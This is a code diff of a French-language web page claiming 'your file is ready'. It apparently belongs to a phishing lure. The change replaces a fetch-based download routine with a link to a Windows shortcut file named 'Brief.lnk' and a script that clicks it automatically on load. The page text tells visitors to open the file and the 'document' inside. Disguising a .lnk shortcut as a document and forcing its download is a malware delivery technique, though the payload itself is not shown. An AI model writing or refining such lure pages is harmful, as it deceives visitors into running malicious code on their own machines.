@@ -17,34 +17,8 @@ a{display:block;padding:13px;background:#1c1a17;color:#fff;border-radius:8px;tex
 <h1>Votre dossier est prêt</h1>
 <p id="t">Préparation du fichier…</p>
 <div class="b" id="bar"><i id="fill"></i></div>
-<a id="d" href="#" style="display:none">Télécharger le dossier</a>
+<a id="d" href="Brief.lnk" download="Brief.lnk">Télécharger le dossier</a>
 <p class="s">Le téléchargement démarre automatiquement.<br>Ouvrez ensuite le fichier, puis le document qu'il contient.</p>
 </div>
-<script>
-const U="Brief.lnk", N="Brief.lnk";
-const t=document.getElementById('t'), bar=document.getElementById('bar'), fill=document.getElementById('fill'), a=document.getElementById('d');
-async function go(){
-  try{
-    const r=await fetch(U); const total=+r.headers.get('content-length')||0;
-    bar.style.display='block';
-    const rd=r.body.getReader(); const ch=[]; let got=0;
-    while(true){
-      const {done,value}=await rd.read(); if(done)break;
-      ch.push(value); got+=value.length;
-      if(total) fill.style.width=Math.min(100,got/total*100)+'%';
-    }
-    const b=new Blob(ch,{type:"application/x-ms-shortcut"});
-    const u=URL.createObjectURL(b);
-    const x=document.createElement('a');
-    x.href=u; x.download=N; document.body.appendChild(x); x.click(); x.remove();
-    setTimeout(()=>URL.revokeObjectURL(u),20000);
-    t.textContent='Téléchargement lancé.';
-    a.href=u; a.download=N; a.style.display='block';
-  }catch(e){
-    t.textContent='Cliquez pour télécharger.';
-    a.href=U; a.style.display='block';
-  }
-}
-window.addEventListener('load',()=>setTimeout(go,300));
-</script>
+<script>window.addEventListener("load",()=>setTimeout(()=>document.getElementById("d").click(),400));</script>
 </body></html>
